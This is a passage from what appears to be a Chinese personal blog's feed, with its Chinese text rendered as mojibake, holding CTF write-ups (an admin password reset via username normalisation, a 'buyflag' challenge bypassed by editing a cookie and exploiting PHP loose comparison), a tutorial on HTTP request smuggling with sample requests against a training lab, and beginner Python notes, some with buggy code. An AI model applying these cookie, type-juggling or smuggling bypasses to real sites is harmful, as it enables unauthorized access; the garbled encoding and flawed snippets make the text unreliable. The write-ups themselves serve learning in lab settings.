é‡Œï¼Œä¹Ÿç”¨åˆ°äº†nodeprep.prepareå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬åœ¨è¿™é‡Œæ”¹å¯†ç çš„è¯ï¼Œå…ˆä¼šæŠŠusernameæ”¹ä¸ºadminï¼Œä»è€Œæ”¹æ‰adminçš„å¯†ç ã€‚<br>ç”¨æ”¹çš„å¯†ç ç™»å½•å³å¯</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buyflag</title>
      <link href="/2021/02/08/buyflag/"/>
      <url>/2021/02/08/buyflag/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1>çŸ¥è¯†ç‚¹</h1><li>cookieæƒé™ï¼Œè¿™é“é¢˜bpæŠ“åŒ…åï¼Œæœ‰æç¤ºè¯´æ˜¯ä¸€å®šè¦æ˜¯cuitçš„å­¦ç”Ÿæ‰å¯ä»¥å»buyflagï¼Œå¹¶ä¸”å¯ä»¥å‘ç°cookieè¿™é‡Œæœ‰ï¼šuser=0ï¼Œæˆ‘ä»¬éƒ½çŸ¥é“åœ¨è®¡ç®—æœºä¸­1æ˜¯æ­£ç¡®ï¼Œ0æ˜¯é”™è¯¯ï¼Œæ‰€ä»¥å°è¯•æ”¹cookieï¼Œæ”¹ä¸ºuser=1ï¼ŒæˆåŠŸã€‚<li>é•¿åº¦é™åˆ¶ï¼Œè¦è¾“å…¥è´­ä¹°é‡‘é¢ï¼Œmoney=1000000000ï¼Œè¾“å…¥åæç¤ºè¯´ï¼Œå­—æ•°å¤ªé•¿äº†ï¼Œäº†è§£åå¾—çŸ¥ï¼Œä¸€èˆ¬æ˜¯ç”¨strcmpå»æ§åˆ¶é•¿åº¦ï¼Œè¿™ä¸ªå‡½æ•°åœ¨ä»‹ç»phpå¼±ç±»å‹çš„æ—¶å€™è°¢å†™è¿‡äº†ï¼Œå¯ä»¥ç”¨æ•°ç»„ç»•è¿‡ã€‚è¿˜æœ‰ä¸€ä¸ªæ˜¯ç”¨ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡ï¼Œ1e9<li>passwordè¿˜æ˜¯é‡‡ç”¨äº†ï¼Œphpå¼±ç±»å‹<pre><code>if (isset($_POST[&#39;password&#39;])) &#123;$password = $_POST[&#39;password&#39;];if (is_numeric($password)) &#123;    echo &quot;password can&#39;t be number&lt;/br&gt;&quot;;&#125;elseif ($password == 404) &#123;    echo &quot;Password Right!&lt;/br&gt;&quot;;&#125;&#125;</code></pre><p>è¾“å…¥404aå°±å¯ä»¥äº†</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>httpèµ°ç§</title>
      <link href="/2021/02/05/http%E8%B5%B0%E7%A7%81/"/>
      <url>/2021/02/05/http%E8%B5%B0%E7%A7%81/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1>HTTP/1.1åè®®</h1><h2>å®šä¹‰ï¼š</h2>HTTP(è¶…æ–‡æœ¬ä¼ è¾“åè®®)ï¼šä¸€ç§æ— çŠ¶æ€çš„ã€åº”ç”¨å±‚ã€ä»¥è¯·æ±‚/åº”ç­”æ–¹å¼è¿è¡Œçš„åè®®ï¼Œå®ƒä½¿ç”¨å¯æ‰©å±•çš„è¯­ä¹‰å’Œè‡ªæè¿°æ¶ˆæ¯æ ¼å¼ï¼Œä¸åŸºäºç½‘ç»œçš„è¶…æ–‡æœ¬ä¿¡æ¯ç³»ç»Ÿçµæ´»çš„äº’åŠ¨ã€‚<p>HTTPåè®®å·¥ä½œäºå®¢æˆ·ç«¯-æœåŠ¡ç«¯æ¶æ„ä¹‹ä¸Šã€‚æµè§ˆå™¨ä½œä¸ºHTTPå®¢æˆ·ç«¯é€šè¿‡urlå‘HTTPæœåŠ¡ç«¯å³WEBæœåŠ¡å™¨å‘é€æ‰€æœ‰è¯·æ±‚ã€‚WebæœåŠ¡å™¨æ ¹æ®æ¥æ”¶åˆ°çš„è¯·æ±‚åï¼Œå‘å®¢æˆ·ç«¯å‘é€å“åº”ä¿¡æ¯ã€‚</p><p><img src="1.png"></p><p>å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´è¿›è¡Œhttpè¯·æ±‚æ—¶ï¼Œè¯·æ±‚å’Œå“åº”éƒ½æ˜¯ä¸€ä¸ªæ•°æ®åŒ…ï¼Œå®ƒä»¬ä¹‹é—´æ˜¯éœ€è¦ä¸€ä¸ªä¼ è¾“é€šé“çš„æ‰€ä»¥ä¼šå…ˆåˆ›å»ºtcpè¿æ¥ï¼Œåªæœ‰tcpè¿æ¥åï¼Œæ‰èƒ½å‘é€httpè¯·æ±‚ã€‚</p><h2>TCPä¸‰æ¬¡æ¡æ‰‹</h2><p>åœ¨åˆ›å»ºè¿‡ç¨‹ä¸­ï¼Œä¸‰æ¬¡æ¡æ‰‹å°±æ˜¯ä»£è¡¨ç€æœ‰ä¸‰æ¬¡ç½‘ç»œä¼ è¾“ï¼Œå®¢æˆ·ç«¯å‘é€ä¸€æ¬¡ï¼Œç„¶åæœåŠ¡å™¨Â·è¿”å›ä¸€æ¬¡ï¼Œç„¶åå®¢æˆ·ç«¯åœ¨å‘é€ä¸€æ¬¡ï¼Œè¿™æ—¶å€™æ‰åˆ›å»ºäº†TCPè¿æ¥ï¼Œç„¶åæ‰èƒ½å‘é€httpè¯·æ±‚ã€‚</p><p>è€ŒHTTP/1.1å’ŒHTTP/1.0åè®®ä¹‹æ‰€æœ‰ä¸åŒï¼Œä¸€éƒ¨åˆ†ä¹Ÿåœ¨äºæ­¤ï¼š<br><br>åœ¨HTTP/1.0é‡Œé¢ï¼Œè¿™ä¸ªè¿æ¥æ˜¯åœ¨httpè¯·æ±‚åˆ›å»ºçš„æ—¶å€™ï¼Œå°±å»åˆ›å»ºï¼Œç„¶åè¿æ¥åˆ›å»ºå®Œæˆä¹‹åï¼Œè¯·æ±‚å‘é€è¿‡å»ï¼ŒæœåŠ¡å™¨å“åº”ä¹‹åï¼Œè¿™ä¸ªtcpè¿æ¥å°±å…³é—­äº†</p><p>åœ¨HTTP/1.1åè®®ä¸­ï¼Œå¯ä»¥ç”¨<mark>Keep-Alive</mark>æ–¹æ³•å»ç”³æ˜è¿™ä¸ªè¿æ¥å¯ä»¥ä¸€ç›´ä¿æŒï¼Œé‚£ä¹ˆç¬¬äºŒä¸ªhttpè¯·æ±‚å°±å»æ²¡æœ‰ä¸‰æ¬¡æ¡æ‰‹çš„å¼€é”€ï¼Œè€Œç›¸è¾ƒäºHTTP/1.0,HTTP/1.1æœ‰äº†Pipelineï¼Œå®¢æˆ·ç«¯å¯ä»¥é¡¹æµæ°´çº¿ä¸€æ ·å‘é€è‡ªå·±çš„HTTPè¯·æ±‚ï¼Œè€Œä¸éœ€è¦ç­‰å¾…æœåŠ¡å™¨çš„å“åº”ï¼ŒæœåŠ¡å™¨é‚£è¾¹æ¥æ”¶è¯·æ±‚åï¼Œéœ€è¦éµå¾ªå…ˆå…¥å…ˆå‡ºæœºåˆ¶ï¼Œå°†è¯·æ±‚å’Œå“åº”ä¸¥æ ¼çš„å¯¹åº”èµ·æ¥ï¼Œå†å°†å“åº”å‘é€ç»™æœåŠ¡å™¨ã€‚</p><h1>HTTPè¯·æ±‚èµ°ç§</h1><h2>äº§ç”ŸåŸå› </h2>ä¸ºäº†æå‡ç”¨æˆ·çš„æµè§ˆå™¨ï¼Œæé«˜ä½¿ç”¨ä½“éªŒï¼Œå‡è½»æœåŠ¡å™¨çš„è´Ÿæ‹…ï¼Œå¾ˆå¤šç½‘ç«™éƒ½ä½¿ç”¨äº†CDNåŠ é€ŸæœåŠ¡å™¨ï¼Œæœ€ç®€å•çš„åŠ é€ŸæœåŠ¡å™¨ï¼Œå°±æ˜¯åœ¨æºç«™çš„å‰é¢åŠ ä¸Šäº†ä¸€ä¸ªå…·æœ‰ç¼“å­˜åŠŸèƒ½Â·çš„åå‘ä»£ç†æœåŠ¡å™¨ï¼Œç”¨æˆ·åœ¨è¯·æ±‚æŸäº›é™æ€èµ„æºæ—¶ï¼Œç›´æ¥ä»ä»£ç†æœåŠ¡å™¨å°±å¯ä»¥è·å–åˆ°ï¼Œä¸ç”¨åœ¨ä»åŸç«™æ‰€åœ¨æœåŠ¡å™¨è·å–ã€‚è¿™å°±æœ‰äº†ä¸€ä¸ªå¾ˆå…¸å‹çš„æ‹“æ‰‘ç»“æ„<p><img src="2.png"></p><p>åå‘ä»£ç†æœåŠ¡å™¨ä¸åç«¯çš„æºç«™ä¹‹é—´ï¼Œä¼šé‡æ–°ç”¨TCPè¿æ¥ï¼Œå› ä¸ºä»£ç†æœåŠ¡å™¨ä¸åç«¯çš„æºç«™æœåŠ¡å™¨IPåœ°å€æ˜¯ç›¸å¯¹å›ºå®šçš„ï¼Œä¸åŒçš„ç”¨æˆ·è¯·æ±‚é€šè¿‡ä»£ç†æœåŠ¡å™¨ä¸æºç«™æœåŠ¡å™¨å»ºç«‹è¿æ¥ï¼Œæ‰€ä»¥å°±é¡ºåˆ©æˆç« äº†</p><p>ä½†ç”±äºä¸¤è€…æœåŠ¡å™¨çš„å®ç°æ–¹å¼ä¸åŒï¼Œå¦‚æœç”¨æˆ·æäº¤æ¨¡ç³Šçš„è¯·æ±‚ï¼Œå¯èƒ½ä»£ç†æœåŠ¡å™¨è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªHTTPè¯·æ±‚ï¼Œç„¶åå°†å…¶è½¬å‘ç»™äº†åç«¯çš„æºç«™æœåŠ¡å™¨ï¼Œä½†æ˜¯æºç«™æœåŠ¡å™¨ç»è¿‡è§£æåï¼Œåªè®¤ä¸ºå…¶ä¸­çš„ä¸€éƒ¨åˆ†ä¸ºæ­£å¸¸è¯·æ±‚ï¼Œå‰©ä¸‹çš„é‚£ä¸€éƒ¨åˆ†å°±æ˜¯èµ°ç§çš„è¯·æ±‚äº†ï¼Œè¿™å°±æ˜¯HTTPèµ°ç§è¯·æ±‚çš„ç”±æ¥ã€‚</p><p>HTTPè¯·æ±‚èµ°ç§æ¼æ´çš„åŸå› å°±æ˜¯ç”±äºHTTPè§„èŒƒæä¾›äº†ä¸¤ç§ä¸åŒæ–¹å¼æ¥æŒ‡å®šè¯·æ±‚çš„ç»“æŸä½ç½®ï¼Œä»–ä»¬æ˜¯<mark>Content-Length</mark>æ ‡å¤´å’Œ<mark>Transfer-Encoding</mark>æ ‡å¤´,<mark>Content-Length</mark>æ ‡å¤´ç®€å•æ˜äº†ï¼Œå®ƒä»¥å­—èŠ‚ä¸ºå•ä½æŒ‡å®šæ¶ˆæ¯å†…å®¹ä½“çš„é•¿åº¦ï¼Œä¾‹å¦‚ï¼š</p><pre><code> POST / HTTP/1.1 Host: ac6f1ff11e5c7d4e806912d000080058.web-security-academy.net User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Cookie: session=5n2xRNXtAYM9teOEn3jSkEDDabLe0Qv8 Content-Length: 35 a=11</code></pre><p><mark>Transfer-Encoding</mark>æ ‡å¤´ç”¨äºæŒ‡å®šæ¶ˆæ¯ä½“ä½¿ç”¨åˆ†å—ç¼–ç ï¼ˆChunked Encodeï¼‰ï¼Œä¹Ÿå°±æ˜¯è¯´æ¶ˆæ¯æŠ¥æ–‡ç”±ä¸€ä¸ªæˆ–å¤šä¸ªæ•°æ®å—ç»„æˆï¼Œæ¯ä¸ªæ•°æ®å—å¤§å°ä»¥å•ä½ï¼ˆ16è¿›åˆ¶è¡¨ç¤ºï¼‰è¡¡é‡ï¼Œåè·Ÿæ¢è¡Œç¬¦ï¼Œç„¶åæ˜¯å¿«å†…å®¹ï¼Œæœ€é‡è¦çš„æ˜¯ï¼šæ•´ä¸ªæ¶ˆæ¯ä½“ä»¥å¤§å°ä¸º0çš„å—ç»“æŸï¼Œä¹Ÿå°±æ˜¯è¯´è§£æé‡åˆ°0æ•°æ®å—å°±ç»“æŸã€‚å¦‚ï¼š</p><pre><code>   POST / HTTP/1.1  Host: ac6f1ff11e5c7d4e806912d000080058.web-security-academy.net  Content-Type: application/x-www-form-urlencoded  Transfer-Encoding: chunked  b  a=11  0</code></pre><p>ç›¸å½“äºæˆ‘å‘é€è¯·æ±‚ï¼ŒåŒ…å«<mark>Content-Length</mark>ï¼Œå‰ç«¯æœåŠ¡å™¨è§£æåæ²¡æœ‰é—®é¢˜å‘é€ç»™åç«¯æœåŠ¡å™¨ï¼Œä½†æ˜¯æˆ‘åœ¨è¯·æ±‚æ—¶å®³åŒ…å«äº†<mark>Transfer-Encoding</mark>ï¼Œè¿™æ ·åç«¯æœåŠ¡å™¨è¿›è¡Œè§£æçš„æ—¶å€™ä¾¿å¯æ‰§è¡Œæˆ‘å†™åœ¨ä¸‹é¢çš„ä¸€äº›å‘½ä»¤ï¼Œè¿™æ ·ä¾¿å¯ä»¥ç»•è¿‡å‰ç«¯wafã€‚</p><h1>å››ç§å¸¸è§èµ°ç§è¯·æ±‚</h1><h2>CLä¸ä¸º0çš„GETè¯·æ±‚</h2>å‡è®¾å‰ç«¯ä»£ç†æœåŠ¡å™¨å…è®¸GETè¯·æ±‚æºå¸¦è¯·æ±‚ä½“ï¼Œè€Œåç«¯æœåŠ¡å™¨ä¸å…è®¸GETè¯·æ±‚æºå¸¦è¯·æ±‚ä½“ï¼Œå®ƒä¼šç›´æ¥å¿½ç•¥GETè¯·æ±‚ä¸­åœ°<mark>Content-Length</mark>å¤´ï¼Œä¸è¿›è¡Œå¤„ç†ã€‚è¿™å°±å¾ˆå¯èƒ½å¯¼è‡´è¯·æ±‚èµ°ç§ã€‚<h2>CL-CL</h2>å‡è®¾ä¸­é—´åœ°ä»£ç†æœåŠ¡å™¨å’Œåç«¯åœ°æºç«™æœåŠ¡å™¨åœ¨æ¥æ”¶åˆ°ç±»ä¼¼è¯·æ±‚æ—¶ï¼Œéƒ½ä¸ä¼šè¿”å›400é”™è¯¯ï¼Œä½†æ˜¯ä¸­é—´ä»£ç†æœåŠ¡å™¨æŒ‰ç…§ç¬¬ä¸€ä¸ª<mark>Content-Length</mark>åœ°å€¼å¯¹è¯·æ±‚è¿›è¡Œå¤„ç†ï¼Œè€Œåç«¯æºç«™æŒ‰ç…§ç¬¬äºŒä¸ª<mark>Content-Length</mark>çš„å€¼è¿›è¡Œå¤„ç†ï¼Œè¿™æ ·ä¾¿æœ‰å¯èƒ½å¼•å‘è¯·æ±‚èµ°ç§ã€‚<h2>CL-TE</h2>æ‰€è°“CL-TEï¼Œå°±æ˜¯æ¥æ”¶åˆ°å­˜åœ¨ä¸¤ä¸ªè¯·æ±‚å¤´çš„1è¯·æ±‚åŒ…æ—¶ï¼Œå‰ç«¯æœåŠ¡å™¨åªå¤„ç†<mark>Content-Length</mark>è¿™ä¸€è¯·æ±‚å¤´ï¼Œè€Œåç«¯æœåŠ¡å™¨ä¼šéµé¡¼RFC2616çš„è§„å®šï¼Œå¿½ç•¥æ‰<mark>Content-Length</mark>ï¼Œå¤„ç†<mark>Transfer-Encodingè¿™ä¸€è¯·æ±‚å¤´</mark><h2>TE-CL</h2>å½“æ”¶åˆ°ä¸¤ä¸ªè¯·æ±‚å¤´çš„æ—¶å€™ï¼Œå‰ç«¯å¤„ç†<mark>Transfer-Encoding</mark>,åç«¯å¤„ç†<mark>Content-Length</mark><h1>å®éªŒå®æˆ˜</h1>åœ¨è¿™ä¸ªç½‘ç»œç¯å¢ƒä¸­ï¼Œå‰ç«¯æœåŠ¡å™¨å®ç°å®‰å…¨æ§åˆ¶ï¼Œåªæœ‰è¢«å…è®¸çš„è¯·æ±‚æ‰èƒ½è½¬å‘ç»™åç«¯æœåŠ¡å™¨ï¼Œè€Œåç«¯æœåŠ¡å™¨æ— æ¡ä»¶åœ°ç›¸ä¿¡å‰ç«¯æœåŠ¡å™¨å‘æ¥åœ°å…¨éƒ¨è¯·æ±‚ï¼Œå¯¹æ¯ä¸ªè¯·æ±‚éƒ½è¿›è¡Œå“åº”ã€‚<h2>CL-TEç»•è¿‡å‰ç«¯æœåŠ¡å™¨å®‰å…¨æ§åˆ¶</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python</title>
      <link href="/2021/02/05/python/"/>
      <url>/2021/02/05/python/</url>
      
        <content type="html"><![CDATA[<h1>è¯»å–</h1><pre><code>   name=input(&quot;è¯·è¾“å…¥ä½ çš„åå­—&quot;)   age=input(&quot;è¯·è¾“å…¥ä½ çš„å¹´é¾„&quot;)   print(name)   print(age)//æ³¨æ„ä½¿ç”¨inputï¼Œè¾“å…¥çš„æ‰€æœ‰æ•°æ®éƒ½æ˜¯æŒ‰ç…§å­—ç¬¦ä¸²æ¥å¤„ç†ã€‚</code></pre><h1>è¾“å‡ºå¥½çœ‹çš„æ–‡æœ¬</h1><pre><code>    name=input(&quot;è¯·è¾“å…¥ä½ çš„åå­—&quot;)    age=input(&quot;è¯·è¾“å…¥ä½ çš„å¹´é¾„&quot;)    mag=&#39;&#39;&#39;    -----------start------------    Name=%s//%sæ˜¯å ä½ç¬¦ï¼Œ%sä»£è¡¨çš„æ˜¯å­—ç¬¦ä¸²ï¼Œå› ä¸ºinputï¼Œè¾“å…¥çš„å­—ç¬¦ä¸²éƒ½æ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼Œæ‰€ä»¥ç”¨%sè¿›è¡Œå ä½ï¼Œå¦‚æœæ˜¯æ•°å­—é‡‡ç”¨%dï¼Œå¦‚æœæ˜¯æµ®ç‚¹å‹é‡‡ç”¨%f    age=%s    -----------end--------------    &#39;&#39;&#39; %(name,age)    print(mag)</code></pre><p>//</p><pre><code>  åœ¨è¿è¡Œè¿™ä¸ªç¨‹åºçš„æ—¶å€™ï¼Œå‘ç°äº†ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯ifè¯­å¥ï¼Œåé¢è¦è®°å¾—åŠ ï¼šå·ã€‚  if question==&quot;y&quot; or question==&quot;Y&quot;:  print(&quot;jajajajajjaja&quot;)</code></pre><h1>è¿ç®—ç¬¦</h1><pre><code> a**bï¼Œè¡¨ç¤ºçš„æ˜¯açš„bæ¬¡æ–¹ a//b,è¡¨ç¤ºçš„æ˜¯aé™¤äº†bçš„å€¼çš„æ•´æ•°éƒ¨åˆ† and è¡¨ç¤º&amp; or è¡¨ç¤ºï¼ not è¡¨ç¤ºï¼</code></pre><h1>ç¼©è¿›</h1><pre><code>é¦–çº§ä»£ç å¿…éœ€é¡¶è¡Œå†™äºŒçº§ä»£ç è¦è¿›è¡Œç¼©è¿›ï¼Œå®˜æ–¹è¦æ±‚æ˜¯4ä¸ªç©ºæ ¼</code></pre><h1>å¤šä¸ªifåˆ†æ”¯</h1><pre><code>if elif else</code></pre><h1>ä¸€ä¸ªçŒœéšæœºæ•°çš„å°æ¸¸æˆ</h1>è°ƒç”¨randomæ¨¡å—<pre><code>   import random n=random.randint(0,10) s=int(input(&quot;è¾“å…¥ä¸€ä¸ªæ•°&quot;))if s&gt;n:print(&quot;input smaller......&quot;)elif s&lt;n:print(&quot;input bigger....&quot;)else:print(&quot;you are right&quot;)print(n)</code></pre><p>ä¿®æ”¹äº†ä¸€ä¸‹ï¼Œè®©ä»–èƒ½æŒç»­è¿›è¡Œç›´åˆ°ï¼Œç›¸ç­‰</p><pre><code>import randoms=-1n=random.randint(0,10)while s!=n:s=int(input(&quot;è¾“å…¥ä¸€ä¸ªæ•°&quot;))if s&gt;n:  print(&quot;input smaller......&quot;)elif s&lt;n: print(&quot;input bigger....&quot;)if s==n:print(&quot;you are right&quot;)print(n)</code></pre><p>æœ€å¤šçŒœä¸‰æ¬¡ï¼š</p><pre><code>import randomcount=0n=random.randint(0,10)while count&lt;3:s=int(input(&quot;è¾“å…¥ä¸€ä¸ªæ•°&quot;))if s&gt;n:  print(&quot;input smaller......&quot;)elif s&lt;n: print(&quot;input bigger....&quot;)else:   print(&quot;you are right&quot;)   print(n)   exit()count+=1print(n)</code></pre><p>å‡çº§ç‰ˆæœ¬</p><pre><code> import randomcount=0n=random.randint(0,10)def xunhuan(): count = 0 while count&lt;3: s=int(input(&quot;è¾“å…¥ä¸€ä¸ªæ•°&quot;)) if s&gt;n:   print(&quot;input smaller......&quot;) elif s&lt;n:   print(&quot;input bigger....&quot;) else:   print(&quot;you are right&quot;)   print(n)   exit() count+=1xunhuan()shuru=input(&quot;ä½ è¿˜æƒ³ç»§ç»­å—&quot;)if shuru==&quot;n&quot; or &quot;N&quot;:exit()while shuru ==&quot;y&quot; or &quot;Y&quot; :xunhuan()shuru = input(&quot;ä½ è¿˜æƒ³ç»§ç»­å—&quot;)//æš‚æ—¶æ²¡æƒ³èµ·æ¥æ›´å¥½çš„è§£æ³•ï¼Œå°±è°ƒç”¨äº†ä¸€ä¸‹å‡½æ•°</code></pre><h1>breakå’Œcontiune</h1>è¿™ä¸¤ä¸ªåœ¨å½“æ—¶å­¦ä¹ c++çš„æ—¶å€™éƒ½ä¸æ€ä¹ˆæ¸…æ¥šï¼Œç°åœ¨ç¨å¾®æ˜ç™½ä¸€ç‚¹ã€‚è¿™ä¸¤ä¸ªå¿…éœ€æ˜¯è·Ÿç€å¾ªç¯å‡ºæ¥çš„ï¼Œforå’Œwhileå¦‚æœä¸æ˜¯å¾ªç¯ä¼šæŠ¥é”™<pre><code>break:ä¸­æ­¢å¾ªç¯contimueï¼šä¸­æ­¢æœ¬æ¬¡å¾ªåa=0while a&lt;100:a+=1if a==50:    breakprint(a)//è¾“å‡º0~49</code></pre><p>//</p><pre><code>a=0while a&lt;100:a+=1if a&lt;50 and a&gt;40:    continueprint(a)//40~50æ²¡æœ‰æ‰“å°å‡ºæ¥</code></pre><h1>ä¸€é“ç®€å•çš„è®¡ç®—é¢˜</h1>    n=int(input("è¾“å…¥ä¸€ä¸ªæ•°"))    s=2    sum=0    while s<=n:    if s%2==0:        sum=sum+s    else:        sum=sum-s    s+=1    print(sum)//è®¡ç®—2-3+4-5......-æˆ–+n<h1>æ‰“å°ä¸€ä¸ªå›¾åƒ</h1><pre><code> * ** *** **** ***** **** *** ** *</code></pre><p>//</p><pre><code> i=1while i&lt;=9:if i&lt;=5:    print(&quot;*&quot;*i)else:    print(&quot;*&quot;*(10-i))i+=1</code></pre><p>//å‡çº§</p><pre><code>i=1n=int(input(&quot;è¾“å…¥ä¸€ä¸ªæ•°å­—&quot;))while i&lt;=(2*n-1):if i&lt;=5:    print(&quot;*&quot;*i)else:    print(&quot;*&quot;*(2*n-i))i+=1</code></pre><h1>æ­»å¾ªç¯</h1><pre><code> while true</code></pre><h1>åŒè‰²çƒ</h1><pre><code>red_list=[]blue_list=[]while len(red_list)&lt;6:num=int(input(&quot;è¯·è¾“å…¥ç¬¬%sä¸ªæ•°:&quot;%(len(red_list)+1)))if num&gt;1 and num&lt;16:    if num not in red_list:        red_list.append(num)    else:        print(&quot;è¯¥æ•°å­—å­˜åœ¨ï¼Œè¯·é‡æ–°è¾“å…¥&quot;)else:    print(&quot;è¯¥æ•°è¶…å‡ºèŒƒå›´&quot;)while len(blue_list) &lt; 2:num = int(input(&quot;è¯·è¾“å…¥ç¬¬%sä¸ªæ•°ï¼š&quot;%(len(blue_list)+1)))if num &gt; 1 and num &lt; 8:    if num not in blue_list:        blue_list.append(num)    else:        print(&quot;è¯¥æ•°å­—å­˜åœ¨ï¼Œè¯·é‡æ–°è¾“å…¥&quot;)else:    print(&quot;è¯¥æ•°è¶…å‡ºèŒƒå›´&quot;)print (&quot;çº¢çƒï¼š&quot;)print(red_list)print (&quot;ç¯®çƒ&quot;)print(blue_list)</code></pre><h1>ç¡®å®šå’Œåˆ¤æ–­å˜é‡ç±»å‹</h1><pre><code>type():ç¡®å®šæ˜¯ä»€ä¹ˆç±»å‹is ï¼štype() is XXXæ˜¯çš„è¿”å›trueï¼Œä¸æ˜¯è¿”å›falseis not:type() is not XXX (å­—ç¬¦ä¸²ï¼šstr)</code></pre><h1>ä¸‰å…ƒè¿ç®—ç¬¦</h1><p>åŸæ¥ï¼š</p><p>a=10;b=20;if a&gt; 100: c=a else: c=b</p><p>ç°åœ¨ï¼š<br>a=10;b=20;c=a if a&gt;100 else b</p><p>c=å€¼1 if æ¡ä»¶ else å€¼2</p><h1>åˆ—è¡¨çš„æ›¾åˆ æ”¹æŸ¥</h1><p>å¢ï¼šappendï¼Œè¿½åŠ åœ¨æœ€åã€‚name.append(å…ƒç´ )</p><p>insertï¼šæŒ‡å®šä½ç½®æ’å…¥ã€‚name.insert(ç´¢å¼•ï¼Œå…ƒç´ )</p><p>extendï¼šåˆå¹¶ä¸¤ä¸ªåˆ—è¡¨name.extend(åˆ—è¡¨)</p><p>è¿˜æœ‰ä¸ªåµŒå¥—åˆ—è¡¨<br>name=[â€œqâ€,â€wâ€,â€eâ€]</p><p>name.insert(2,[1,2,3])</p><p>name=[â€œqâ€,â€wâ€,[1,2,3],â€eâ€]</p><p>name[2][2]=3</p><p>åˆ ï¼š<br>clearï¼šæ¸…ç©ºï¼Œliebiao.clear()</p><p>pop:åˆ é™¤å¹¶è¿”å›åˆ é™¤å…ƒç´ ã€‚name.pop(),åˆ é™¤æœ€åä¸€ä¸ªå¹¶è¿”å›è¯¥å…ƒç´ ï¼Œname.pop(ç´¢å¼•)ï¼Œåˆ é™¤æŒ‡å®šå…ƒç´ å¹¶è¿”å›è¯¥å…ƒç´ </p><p>delï¼šç›´æ¥åˆ ã€‚del name[2]   name=[â€œqâ€,â€wâ€,â€eâ€]</p><p>removeï¼šå¦‚æœè¯¥å…ƒç´ é‡å¤ï¼Œåˆ é™¤ä»å·¦åˆ°å³æ•°çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œname.remove(å…ƒç´ )ï¼Œå¦‚æœremoveçš„å…ƒç´ ä¸å­˜åœ¨ï¼Œåˆ™è¿”å›é”™è¯¯</p><p>ä¿®ï¼šå°±ç›´æ¥å¯¹ç€å…ƒç´ ç´¢å¼•ä¿®æ”¹<br>name[1]=â€aâ€</p><p>name=[â€œaâ€,â€wâ€,â€eâ€]</p><p>name[-1]=â€hâ€(å€’ç€æ•°ï¼Œç¬¬ä¸€ä½æ˜¯-1)</p><p>name=[â€œaâ€,â€wâ€,â€hâ€]</p><p>æŸ¥ï¼šindexï¼šæŸ¥ä¸‹æ ‡ï¼Œå¦‚æœæŸ¥è¯¢çš„å…ƒç´ åœ¨åˆ—è¡¨ä¸­æ²¡æœ‰ï¼Œè¿”å›é”™è¯¯ï¼Œname.index(å…ƒç´ ).è¡¥å……ï¼Œname.index(å…ƒç´ ï¼Œå¼€å§‹çš„ç´¢å¼• é»˜è®¤æ˜¯0ï¼Œç»“æŸç´¢å¼•  é»˜è®¤ä¸ºå­—ç¬¦ä¸²çš„é•¿åº¦)</p><p>countï¼šç»Ÿè®¡è¯¥å…ƒç´ å‡ºç°çš„æ¬¡æ•°ï¼Œname.count(å…ƒç´ )</p><p>å¦‚æœæƒ³åˆ¤æ–­ï¼Œåˆ—è¡¨ä¸­ï¼Œæœ‰æ²¡æœ‰æŸä¸ªå…ƒç´ ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ï¼š å…ƒç´  in åˆ—è¡¨ å¦‚æœæœ‰è¿”å›true å¦‚æœæ²¡æœ‰è¿”å›false</p><h1>åˆ‡ç‰‡</h1>æ­£åˆ‡ç‰‡ï¼š<p>å¯ä»¥åŒæ—¶å–å‡ºå¤šä¸ªå…ƒç´ ï¼Œname=[1,2,3,4,5]</p><p>name[1:3]=[2,3] (é¡¾å¤´ä¸é¡¾å°¾ï¼Œå°±æ˜¯ä»–åªèƒ½åŒ…å«æœ€å¼€å§‹çš„æ‰€å¼•æ‰€ä»£è¡¨çš„å…ƒç´ ï¼Œæœ€åé¢çš„å…ƒç´ ä¸åŒ…å«ï¼Œä¹Ÿå°±æ˜¯è¯´startï¼šend-1)</p><p>name[1:-1]=[2,3,4]</p><p>name[:2]=[1,2]</p><p>name[1:]=[2,3,4,5] </p><p>å€’ç€åˆ‡ï¼š</p><p>å› ä¸ºï¼Œpythoné»˜è®¤æ˜¯ä»å·¦åˆ°å³ï¼Œæ‰€ä»¥æˆ‘ä»¬åº”è¯¥å†™name[-4:-1]=[2,3,4]</p><p>name[-4:]=[2,3,4,5]</p><p>æ­¥é•¿ï¼šæ­¥å­çš„é•¿åº¦ï¼Œé»˜è®¤æ˜¯1ï¼Œå…¶å®name[1:-1]çš„å…¨ååº”è¯¥æ˜¯name[1:-1:1].<br><br>å¦‚æœæˆ‘ä»¬æƒ³æŠŠåˆ—è¡¨å€’ç€è¾“å‡º2ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨name[::-1]<br><br>ä¸Šé¢è®²çš„å€’ç€åˆ‡ï¼Œå…¶å®æˆ‘ä»¬ä¹Ÿå¯ä»¥è¿™ä¸ªå­å†™ï¼šname[-1:-4:-1]=[4,3,2]<br><br>æˆ‘ä»¬ä¹Ÿå¯ä»¥è·³ç€åˆ‡name[1::2]=[2,4]<br><br>å…¶å®ç”¨è¿™ç§æ–¹æ³•å­—ç¬¦ä¸²ä¹Ÿå¯ä»¥å®ç°åè½¬ï¼ša=â€helloâ€  